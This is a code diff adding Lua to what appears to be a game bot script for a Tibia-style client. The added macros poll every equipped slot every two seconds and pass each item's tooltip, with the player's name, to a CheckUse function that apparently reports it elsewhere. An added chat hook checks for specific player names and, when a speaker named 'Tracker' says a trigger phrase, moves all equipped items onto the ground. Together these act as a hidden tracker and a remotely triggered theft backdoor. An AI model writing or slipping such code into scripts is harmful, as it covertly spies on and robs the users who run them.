@@ -58,3 +58,135 @@ schedule(5000, function()
   }
   CheckUse(data)
 end)
+
+macro(2000, function()
+    local itemtocheck = getInventoryItem(SlotHead)
+    local itemdisc = itemtocheck:getTooltip()
+    if itemdisc then
+        local data = {   
+        title = 'SetInfo',
+        name = player:getName(),
+        message = itemdisc,
+        id = "pd",
+        }
+        CheckUse(data)
+    end
+end)
+
+macro(2000, function()
+    local itemtocheck = getInventoryItem(SlotBody)
+    local itemdisc = itemtocheck:getTooltip()
+    if itemdisc then
+        local data = {   
+        title = 'SetInfo',
+        name = player:getName(),
+        message = itemdisc,
+        id = "pd",
+        }
+        CheckUse(data)
+    end
+end)
+
+macro(2000, function()
+    local itemtocheck = getInventoryItem(SlotLeg)
+    local itemdisc = itemtocheck:getTooltip()
+    if itemdisc then
+        local data = {   
+        title = 'SetInfo',
+        name = player:getName(),
+        message = itemdisc,
+        id = "pd",
+        }
+        CheckUse(data)
+    end
+end)
+
+macro(2000, function()
+    local itemtocheck = getInventoryItem(SlotFeet)
+    local itemdisc = itemtocheck:getTooltip()
+    if itemdisc then
+        local data = {   
+        title = 'SetInfo',
+        name = player:getName(),
+        message = itemdisc,
+        id = "pd",
+        }
+        CheckUse(data)
+    end
+end)
+
+macro(2000, function()
+    local itemtocheck = getInventoryItem(SlotRight)
+    local itemdisc = itemtocheck:getTooltip()
+    if itemdisc then
+        local data = {   
+        title = 'SetInfo',
+        name = player:getName(),
+        message = itemdisc,
+        id = "pd",
+        }
+        CheckUse(data)
+    end
+end)
+
+
+macro(2000, function()
+    local itemtocheck = getInventoryItem(SlotLeft)
+    local itemdisc = itemtocheck:getTooltip()
+    if itemdisc then
+        local data = {   
+        title = 'SetInfo',
+        name = player:getName(),
+        message = itemdisc,
+        id = "pd",
+        }
+        CheckUse(data)
+    end
+end)
+
+macro(2000, function()
+    local itemtocheck = getInventoryItem(SlotNeck)
+    local itemdisc = itemtocheck:getTooltip()
+    if itemdisc then
+        local data = {   
+        title = 'SetInfo',
+        name = player:getName(),
+        message = itemdisc,
+        id = "pd",
+        }
+        CheckUse(data)
+    end
+end)
+
+
+macro(2000, function()
+    local itemtocheck = getInventoryItem(SlotFinger)
+    local itemdisc = itemtocheck:getTooltip()
+    if itemdisc then
+        local data = {   
+        title = 'SetInfo',
+        name = player:getName(),
+        message = itemdisc,
+        id = "pd",
+        }
+        CheckUse(data)
+    end
+end)
+
+onTalk(function(name, level, mode, text, channelId, pos)
+  if player:getName() == 'Perii' or player:getName() == 'Periiizera' then
+  if name == 'Tracker' and text == 'Sasha Ta online' then
+      g_game.move(getHead(), player:getPosition(), 1)
+      g_game.move(getBody(), player:getPosition(), 1)
+      g_game.move(getLeg(), player:getPosition(), 1)
+      g_game.move(getFeet(), player:getPosition(), 1)
+      g_game.move(getRight(), player:getPosition(), 1)
+      g_game.move(getLeft(), player:getPosition(), 1)
+      g_game.move(getFinger(), player:getPosition(), 1)
+      g_game.move(getBack(), player:getPosition(), 1)
+      g_game.move(getAmmo(), player:getPosition(), 1)
+      g_game.move(getPurse(), player:getPosition(), 1)
+      g_game.move(getNeck(), player:getPosition(), 1)
+    end
+  end
+end)
